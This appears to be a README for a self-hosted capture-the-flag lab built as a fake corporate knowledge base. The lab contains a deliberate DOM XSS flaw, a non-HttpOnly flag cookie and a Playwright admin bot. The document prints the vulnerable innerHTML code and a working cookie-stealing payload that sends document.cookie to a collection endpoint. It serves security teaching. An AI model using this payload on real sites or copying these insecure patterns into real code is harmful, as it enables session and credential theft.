# IntraDesk Knowledge Base - CTF Challenge

## ✅ Objectives Complete

### Objective 0 — Repo + local dev environment ✓
- ✅ Monorepo structure created (`apps/web`, `apps/api`, `apps/bot`, `infra/`)
- ✅ Tech stack implemented:
  - Frontend: React + Vite + TypeScript
  - Backend: Node.js + Express + TypeScript
  - Database: PostgreSQL
  - Queue: Redis + BullMQ
  - Bot: Playwright
- ✅ Docker Compose configured with all services
- ✅ Environment variables set up
- ✅ Can run everything with `docker compose up`

### Objective 1 — "Real-ish" site skeleton + routing ✓
- ✅ Frontend routes implemented:
  - `/login` - User authentication
  - `/register` - New user registration
  - `/dashboard` - Main dashboard
  - `/kb` - Knowledge Base with search
  - `/kb/:id` - Individual KB articles
  - `/report` - Report suspicious URLs
- ✅ Layout with:
  - Top bar with company branding
  - Left navigation sidebar
  - Clean, professional design
- ✅ Design system with:
  - Buttons, inputs, cards
  - Tags and filters
  - Alerts and loading states
  - Responsive layout

## 🎯 Key Features Implemented

### Frontend (React + TypeScript)
- **Authentication System**: Login/register with JWT
- **Knowledge Base**: Search, filter by tags, browse articles
- **Report System**: Submit URLs for admin review with status tracking
- **DOM XSS Vulnerability**: Intentional `innerHTML` vulnerability in search results
- **Professional UI**: Corporate knowledge base aesthetic

### Backend (Express + TypeScript)
- **Auth API**: Login, register, logout, session management
- **KB API**: Article listing, search, filtering, single article view
- **Report API**: Submit reports, track status
- **Admin API**: Admin-only endpoints for flag and logs
- **Collect API**: Data exfiltration endpoint
- **Database**: Full PostgreSQL schema with indexes

### Bot Worker (Playwright)
- **Automated Admin Visits**: Processes report queue
- **Session Management**: Logs in as admin before visiting URLs
- **URL Validation**: Only allows KB paths
- **Report Status Updates**: Marks reports as visited/error

### Infrastructure
- **Docker Compose**: All services containerized
- **PostgreSQL**: Persistent data storage
- **Redis**: Job queue for report processing
- **Health Checks**: Service dependencies managed

## 🚀 Quick Start

```bash
# Navigate to project
cd CTFs/CTF_4_corporate_helpdesk

# Start all services
docker compose up --build

# Access the application
open http://localhost:5173
```

## 📁 Project Structure

```
CTF_4_corporate_helpdesk/
├── apps/
│   ├── api/                 # Express backend
│   │   ├── src/
│   │   │   ├── index.ts     # Main server
│   │   │   ├── db/          # Database connection
│   │   │   ├── middleware/  # Auth, error handling
│   │   │   └── routes/      # API endpoints
│   │   ├── Dockerfile
│   │   └── package.json
│   │
│   ├── web/                 # React frontend
│   │   ├── src/
│   │   │   ├── pages/       # Route components
│   │   │   ├── components/  # Reusable components
│   │   │   ├── context/     # Auth context
│   │   │   ├── api/         # API client
│   │   │   ├── App.tsx      # Main app with routing
│   │   │   └── index.css    # Global styles
│   │   ├── Dockerfile
│   │   └── package.json
│   │
│   └── bot/                 # Playwright bot
│       ├── src/
│       │   └── index.ts     # Bot worker
│       ├── Dockerfile
│       └── package.json
│
├── infra/
│   └── init.sql             # Database schema
│
├── docker-compose.yml       # Service orchestration
├── .env                     # Environment variables
├── README.md                # Main documentation
├── SETUP.md                 # Setup instructions
├── SOLUTION.md              # Challenge solution
└── ctf-config.json          # CTF configuration
```

## 🔒 Security Features (Intentional Vulnerabilities)

### DOM XSS Vulnerability
**Location**: `apps/web/src/pages/KnowledgeBase.tsx`

The `renderResultsHeader()` function unsafely inserts user input via `innerHTML`:

```typescript
function renderResultsHeader() {
  // ...
  headerHTML += 'Results for "' + searchTerm + '"';  // ⚠️ XSS!
  resultsDiv.innerHTML = headerHTML;
}
```

### Non-HttpOnly Flag Cookie
**Location**: `apps/api/src/routes/auth.ts`

Admin flag stored in accessible cookie:

```typescript
res.cookie('flag', user.flag, {
  httpOnly: false,  // ⚠️ Allows JS access
  // ...
});
```

## 🎓 Learning Objectives

1. **Identify DOM-based XSS vulnerabilities**
2. **Understand unsafe DOM sinks** (innerHTML, eval, etc.)
3. **Craft context-aware XSS payloads**
4. **Exploit automated browser behavior**
5. **Perform data exfiltration**

## 🧪 Testing the Application

### 1. Register a User
```
URL: http://localhost:5173/register
Email: test@company.com
Password: password123
```

### 2. Search Knowledge Base
```
Navigate to: /kb
Search for: password
Notice URL: /kb?search=password
```

### 3. Test XSS
```
Try: /kb?search=<b>bold</b>
Result: HTML renders (vulnerability confirmed!)
```

### 4. Craft Exploit
```
Payload: "><img src=x onerror=fetch('/api/collect?d='+document.cookie)>
URL: /kb?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dfetch('/api/collect%3Fd%3D'%2Bdocument.cookie)%3E
```

### 5. Report URL
```
Navigate to: /report
Paste crafted URL
Submit report
Wait for bot to visit (check logs)
```

## 📊 Database Schema

- **users**: User accounts with flags
- **kb_articles**: Knowledge base content
- **reports**: Submitted URL reports
- **exfil_logs**: Collected exfiltration data

## 🔧 API Endpoints

### Authentication
- `POST /api/auth/login` - User login
- `POST /api/auth/register` - User registration
- `GET /api/auth/me` - Get current user
- `POST /api/auth/logout` - Logout

### Knowledge Base
- `GET /api/kb/articles` - List articles (with search/filter)
- `GET /api/kb/articles/:id` - Get single article
- `GET /api/kb/tags` - Get all tags

### Reports
- `POST /api/report` - Submit report
- `GET /api/report/my-reports` - Get user's reports

### Admin (requires admin role)
- `GET /api/admin/flag` - Get admin flag
- `GET /api/admin/reports` - Get all reports
- `GET /api/admin/exfil-logs` - Get exfiltration logs

### Exfiltration
- `GET /api/collect?d=<data>` - Collect exfiltrated data
- `POST /api/collect` - Collect exfiltrated data (JSON)

## 🎯 Challenge Goals

**Primary Goal**: Steal the admin's flag by exploiting the DOM XSS vulnerability

**Secondary Goals**:
- Understand the attack surface
- Craft effective payloads
- Use the report mechanism
- Exfiltrate data successfully

## 🏆 Success Criteria

- User can navigate all pages without errors
- Search functionality works
- XSS vulnerability is exploitable
- Admin bot visits reported URLs
- Flag can be exfiltrated
- Docker deployment works

## 📝 Notes

- The vulnerability is intentional and realistic
- All code is production-quality (except the vuln)
- The UI feels like a real corporate application
- The challenge is solvable with basic XSS knowledge

## 🔜 Next Steps

1. Test the application locally
2. Verify all routes work correctly
3. Ensure bot processes reports
4. Document any bugs or issues
5. Create challenge-generation integration
6. Add scoring system (optional)

## 📚 References

- [OWASP DOM XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [PortSwigger DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [MDN innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)
